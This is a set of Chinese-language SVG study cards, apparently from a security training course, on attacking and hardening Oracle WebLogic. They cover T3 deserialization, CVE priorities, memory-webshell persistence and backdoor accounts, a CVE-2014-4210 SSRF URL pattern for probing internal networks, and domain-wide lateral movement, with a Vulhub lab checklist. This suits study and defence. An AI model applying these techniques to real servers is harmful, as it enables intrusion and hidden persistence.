  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">[OK] 命令无回显 → 换dnslog 先出网探测 在反弹shell</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">[ERR] 500 Unable to compile class for JSP → 权限不足目录</text>
  <rect x="540" y="236" width="220" height="55" rx="10" fill="#faf5ff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">[INFO] 上线后不稳定 → 换内存马 / Filter级别内存马</text>
  <rect x="60" y="309" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">[WARN] 302跳登录 → 检查 Cookie JSESSIONID 注入时带对</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gzjnjl524" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gzjnjl524)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0e7490" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧠 面试：T3协议为什么危险？</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">T3: Weblogic定制协议 RMI-over-HTTP</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">底层: ObjectInputStream 直接反序列化客户端传入对象</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Java原生反序列化 = 攻击者可控任意字节流</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">配合 CC/CB1 链 → 目标服务器直接RCE</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">加上 无需认证 → 全版本批量危害极高</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">防御: T3加密(T3S) / 禁用T3 / RASP拦截 / JEP290</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gd92upl46" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gd92upl46)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#be123c" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📊 CVSS得分 vs 实战优先级</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CVE-2020-14882 → CVSS 9.8 / 优先级P0 (无需登录 通用12c)</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CVE-2019-2725 → CVSS 10.0 / 优先级P0 (10.3.6/12.1.3 通用无权限)</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CVE-2020-2555 → CVSS 9.8 / 优先级P1 (T3开放时)</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CVE-2021-2109 → CVSS 9.8 / 优先级P1 (T3+JNDI 需JDK版本)</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CVE-2018-2628 → CVSS 10.0 / 优先级P2 (10.3.6 + T3)</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">NodeManager 5556 弱口令 → CVSS 9.1 / 优先级P0 (部署级别)</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gk4rvuxro" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gk4rvuxro)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c3aed" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🚩 内存马在Weblogic的5种形态</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① Servlet 内存马 动态注册 addServlet + mapping</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② Filter 内存马 filterConfig 动态添加 / doFilter 拦截</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ Listener 内存马 ServletRequestListener 监听请求</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ Weblogic AuthenticatorProvider 登录后门账号</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ T3协议拦截器 → 特定T3请求直接执行命令 隐蔽级最高</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="grnj4evfz" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#grnj4evfz)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0369a1" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧱 CVE-2014-4210 SSRF漏洞</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">影响版本: 10.0.2 / 10.3.6 (UDDI Explorer)</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">路径: /uddiexplorer/SearchPublicRegistries.jsp?</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">参数: operator=http://内网IP:port/xx → 内网探测</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">回显: could not connect / 404 / 返回内容 差异</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">利用: 扫内网Redis/MySQL/ES/FastCGI / 云元数据</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">修复: 删除 uddiexplorer.war / 打 PSU / WAF拦截URL</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g45w4khqt" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g45w4khqt)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#1e40af" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🛰️ 域架构 vs 单机架构</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">单机Domain: AdminServer 同时承载业务(测试/小站)</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">域架构: AdminServer (7001 管理) + N*ManagedServer (7003+ 业务)</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">生产架构: 通常 AdminServer 7001 仅内网不对外</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">内网SSRF: 打穿业务机 → SSRF 扫7001 Admin → 14882拿下全域</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">危害: 一台受管 → 整个域所有服务器 被部署内存马</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gvyb7vziz" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gvyb7vziz)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#991b1b" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🎓 难度进度条</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">14882 未授权RCE ████████░ 80%</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2725 XMLDecoder ████████░ 80%</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2555 T3反序列化 █████░░░░ 50%</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">控制台弱口令部署WAR ███████░░ 70%</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">加固9件套落地验证 ██████░░░░ 60%</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">域架构内网横向 ████░░░░░ 40%</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="g6cks2zns" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#g6cks2zns)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">✅ Day43 通关自测CheckList</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Weblogic 9种指纹识别 全部掌握</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Vulhub 14882靶机 未授权RCE 成功回显whoami</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2725 XMLDecoder POC 成功执行命令</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">控制台弱口令爆破 + 部署WAR 成功拿Shell</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">T3开放时 2555/2109 成功RCE</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">加固后 全部CVE 验证失效</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">SSRF 4210 内网探测 扫到内网Redis</text>
</svg>
